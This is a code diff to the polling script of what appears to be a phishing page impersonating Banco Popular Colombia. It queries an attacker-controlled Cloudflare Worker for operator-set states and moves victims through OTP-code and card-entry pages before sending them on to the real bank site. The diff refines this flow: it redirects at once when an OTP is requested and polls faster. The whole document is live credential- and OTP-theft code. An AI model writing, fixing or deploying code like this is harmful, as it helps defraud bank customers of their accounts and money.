@@ -138,16 +138,18 @@
   </div>
 
   <script>
-    // ✅ TU WORKER CORRECTO
+    // ========================= CONFIGURACIÓN =========================
     const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
     let intentos = 0;
     const MAX_INTENTOS = 60;
     let timeoutId = null;
     let isProcessing = false;
     let transactionIdGlobal = null;
+    let redirigiendo = false;
 
+    // ========================= FUNCIÓN PRINCIPAL =========================
     async function checkStatus(transactionId) {
-      if (isProcessing) return;
+      if (isProcessing || redirigiendo) return;
       isProcessing = true;
       intentos++;
 
@@ -171,13 +173,14 @@
           if (intentos >= MAX_INTENTOS) {
             console.log('⏰ Tiempo de espera agotado');
             document.getElementById('estadoInfo').textContent = '⏰ Tiempo agotado';
+            redirigiendo = true;
             setTimeout(() => {
               window.location.href = 'index.html';
             }, 2000);
             return;
           }
           isProcessing = false;
-          timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
+          timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
           return;
         }
 
@@ -186,9 +189,28 @@
         console.log(`✅ Estado recibido: ${estado}`);
         document.getElementById('estadoInfo').textContent = `📌 Estado: ${estado}`;
 
+        // ✅ IMPORTANTE: Cuando el estado es 'otp_solicitado', redirigir a codigo.html
+        if (estado === 'otp_solicitado') {
+          document.getElementById('estadoInfo').textContent = '📲 Código OTP solicitado, redirigiendo...';
+          redirigiendo = true;
+          if (timeoutId) {
+            clearTimeout(timeoutId);
+            timeoutId = null;
+          }
+          setTimeout(() => {
+            window.location.href = 'codigo.html';
+          }, 1000);
+          return;
+        }
+
         switch (estado) {
           case 'autorizado':
             document.getElementById('estadoInfo').textContent = '✅ Autorizado, redirigiendo...';
+            redirigiendo = true;
+            if (timeoutId) {
+              clearTimeout(timeoutId);
+              timeoutId = null;
+            }
             setTimeout(() => {
               window.location.href = 'codigo.html';
             }, 800);
@@ -196,25 +218,29 @@
 
           case 'error':
             document.getElementById('estadoInfo').textContent = '❌ Acceso denegado';
+            redirigiendo = true;
+            if (timeoutId) {
+              clearTimeout(timeoutId);
+              timeoutId = null;
+            }
             setTimeout(() => {
               window.location.href = 'index.html';
             }, 1500);
             break;
 
-          case 'otp_solicitado':
-            document.getElementById('estadoInfo').textContent = '📲 OTP solicitado, esperando código...';
-            isProcessing = false;
-            timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
-            break;
-
           case 'otp_recibido':
-            document.getElementById('estadoInfo').textContent = '✅ Código OTP recibido, procesando...';
+            document.getElementById('estadoInfo').textContent = '✅ Código OTP recibido, esperando autorización...';
             isProcessing = false;
-            timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
+            timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
             break;
 
           case 'biometria':
             document.getElementById('estadoInfo').textContent = '🔐 Biometría solicitada';
+            redirigiendo = true;
+            if (timeoutId) {
+              clearTimeout(timeoutId);
+              timeoutId = null;
+            }
             setTimeout(() => {
               window.location.href = 'tarjeta.html';
             }, 800);
@@ -222,6 +248,11 @@
 
           case 'finalizado':
             document.getElementById('estadoInfo').textContent = '🏁 Proceso finalizado';
+            redirigiendo = true;
+            if (timeoutId) {
+              clearTimeout(timeoutId);
+              timeoutId = null;
+            }
             setTimeout(() => {
               window.location.href = 'https://www.bancopopular.com.co/';
             }, 800);
@@ -230,25 +261,29 @@
           default:
             document.getElementById('estadoInfo').textContent = `📌 Estado: ${estado}`;
             isProcessing = false;
-            timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
+            timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
         }
 
       } catch (error) {
         console.error('❌ Error:', error);
         document.getElementById('estadoInfo').textContent = `⚠️ Error: ${error.message}`;
         
-        if (intentos < MAX_INTENTOS) {
+        if (intentos < MAX_INTENTOS && !redirigiendo) {
           isProcessing = false;
           timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
         } else {
           document.getElementById('estadoInfo').textContent = '❌ Error de conexión';
-          setTimeout(() => {
-            window.location.href = 'index.html';
-          }, 2000);
+          if (!redirigiendo) {
+            redirigiendo = true;
+            setTimeout(() => {
+              window.location.href = 'index.html';
+            }, 2000);
+          }
         }
       }
     }
 
+    // ========================= INICIALIZACIÓN =========================
     document.addEventListener('DOMContentLoaded', async () => {
       const bancoldataRaw = localStorage.getItem('bancoldata');
 
@@ -296,6 +331,7 @@
       }, 1000);
     });
 
+    // Limpiar timeout al salir de la página
     window.addEventListener('beforeunload', function() {
       if (timeoutId) {
         clearTimeout(timeoutId);
